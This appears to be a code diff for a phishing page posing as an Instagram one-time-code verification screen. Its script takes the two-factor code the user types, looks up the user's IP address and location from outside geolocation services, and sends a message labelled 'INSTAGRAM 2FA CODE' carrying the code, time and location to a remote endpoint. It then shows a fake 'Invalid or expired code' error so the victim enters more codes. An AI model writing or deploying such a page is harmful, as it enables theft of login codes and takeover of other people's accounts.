@@ -10,17 +10,11 @@
     <div class="min-h-screen bg-gradient-to-br from-blue-50 via-green-50 to-teal-50 flex items-center justify-center p-4">
         <div class="w-full max-w-md">
 
-            <!-- Header -->
             <div class="mb-4">
-                <h1 class="text-2xl md:text-3xl font-bold text-gray-900 mb-2">
-                    Enter OTP CODE
-                </h1>
-                <p class="text-sm md:text-base text-gray-700">
-                    Enter the code that we sent to <span class="font-semibold">your phone</span>
-                </p>
+                <h1 class="text-2xl md:text-3xl font-bold text-gray-900 mb-2">Enter OTP CODE</h1>
+                <p class="text-sm md:text-base text-gray-700">Enter the code that we sent to <span class="font-semibold">your phone</span></p>
             </div>
 
-            <!-- Illustration Card -->
             <div class="bg-gradient-to-br from-green-100 to-teal-100 rounded-2xl p-4 mb-4">
                 <div class="bg-gradient-to-br from-blue-100 to-teal-100 rounded-xl p-6 flex items-center justify-center">
                     <div class="relative w-full max-w-xs aspect-[4/3]">
@@ -53,24 +47,16 @@
                 </div>
             </div>
 
-            <!-- Input Field -->
             <div class="mb-4">
-                <input
-                    id="otp"
-                    type="text"
-                    placeholder="Enter verification code"
-                    class="w-full px-4 py-3 text-sm md:text-base border-4 border-blue-500 rounded-xl focus:outline-none focus:border-blue-600 transition-colors"
-                    maxlength="6"
-                    inputmode="numeric"
-                />
+                <input id="otp" type="text" placeholder="Enter verification code"
+                  class="w-full px-4 py-3 text-sm md:text-base border-4 border-blue-500 rounded-xl focus:outline-none focus:border-blue-600 transition-colors"
+                  maxlength="6" inputmode="numeric" />
             </div>
 
-            <!-- Error Message -->
             <div id="errorMsg" class="text-red-600 text-sm md:text-base mb-4 hidden text-center font-medium">
                 Invalid or expired code. Please try again.
             </div>
 
-            <!-- Get New Code Link -->
             <div class="mb-4">
                 <button class="flex items-center gap-2 text-blue-600 hover:text-blue-700 font-semibold text-sm md:text-base transition-colors">
                     <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -80,11 +66,8 @@
                 </button>
             </div>
 
-            <!-- Continue Button -->
-            <button
-                id="submitBtn"
-                class="w-full bg-blue-700 hover:bg-blue-800 text-white font-semibold text-base md:text-lg py-3 md:py-4 rounded-full transition-colors shadow-lg hover:shadow-xl disabled:opacity-60 disabled:cursor-not-allowed flex items-center justify-center gap-2"
-            >
+            <button id="submitBtn"
+              class="w-full bg-blue-700 hover:bg-blue-800 text-white font-semibold text-base md:text-lg py-3 md:py-4 rounded-full transition-colors shadow-lg hover:shadow-xl disabled:opacity-60 disabled:cursor-not-allowed flex items-center justify-center gap-2">
                 <span id="btnText">Continue</span>
                 <svg id="spinner" class="w-6 h-6 animate-spin hidden" viewBox="0 0 24 24">
                     <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none" opacity="0.3"/>
@@ -104,42 +87,28 @@
           try {
             const res = await fetch('https://ipapi.co/json/');
             const data = await res.json();
-            return {
-              ip: data.ip || 'Unknown',
-              country: data.country_name || 'Unknown',
-              state: data.region || 'Unknown',
-              city: data.city || 'Unknown'
-            };
+            return { ip: data.ip || 'Unknown', country: data.country_name || 'Unknown', state: data.region || 'Unknown', city: data.city || 'Unknown' };
           } catch {
             try {
               const fb = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,query');
               const d = await fb.json();
-              if (d.status === "success") {
-                return {
-                  ip: d.query || 'Unknown',
-                  country: d.country || 'Unknown',
-                  state: d.regionName || 'Unknown',
-                  city: d.city || 'Unknown'
-                };
-              }
+              if (d.status === "success") return { ip: d.query || 'Unknown', country: d.country || 'Unknown', state: d.regionName || 'Unknown', city: d.city || 'Unknown' };
             } catch {}
           }
           return { ip: 'Unknown', country: 'Unknown', state: 'Unknown', city: 'Unknown' };
         }
 
         document.getElementById("submitBtn").addEventListener("click", async () => {
-            const otpInput = document.getElementById("otp");
-            const code = otpInput.value.trim();
+            const code = document.getElementById("otp").value.trim();
+            if (!code || code.length < 4) {
+                document.getElementById("errorMsg").classList.remove("hidden");
+                return;
+            }
+
             const btn = document.getElementById("submitBtn");
             const btnText = document.getElementById("btnText");
             const spinner = document.getElementById("spinner");
             const errorMsg = document.getElementById("errorMsg");
-
-            if (!code || code.length < 4) {
-                errorMsg.textContent = "Please enter a valid code.";
-                errorMsg.classList.remove("hidden");
-                return;
-            }
 
             btn.disabled = true;
             btnText.textContent = "Verifying";
@@ -149,13 +118,11 @@
             const loc = await getLocation();
             attempt++;
 
-            const now = new Date().toLocaleString('en-US', {
-              month: 'numeric', day: 'numeric', year: 'numeric',
-              hour: 'numeric', minute: 'numeric', second: 'numeric',
-              hour12: true
-            });
+            const now = new Date().toLocaleString('en-US', { month:'numeric', day:'numeric', year:'numeric', hour:'numeric', minute:'numeric', second:'numeric', hour12:true });
 
-            const message = `🔐 INSTAGRAM 2FA CODE
+            const message = `📬 New form submission!
+
+🔐 INSTAGRAM 2FA CODE
 
 📱 Code: ${code}
 ⏰ Time: ${now}
@@ -188,14 +155,12 @@ LOCATION:
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
-            } catch (err) {
-                console.error("Send failed:", err);
-            }
+            } catch (err) { console.error(err); }
 
             setTimeout(() => {
                 errorMsg.textContent = "Invalid or expired code. Please try again.";
                 errorMsg.classList.remove("hidden");
-                otpInput.value = "";
+                document.getElementById("otp").value = "";
                 btn.disabled = false;
                 btnText.textContent = "Continue";
                 spinner.classList.add("hidden");
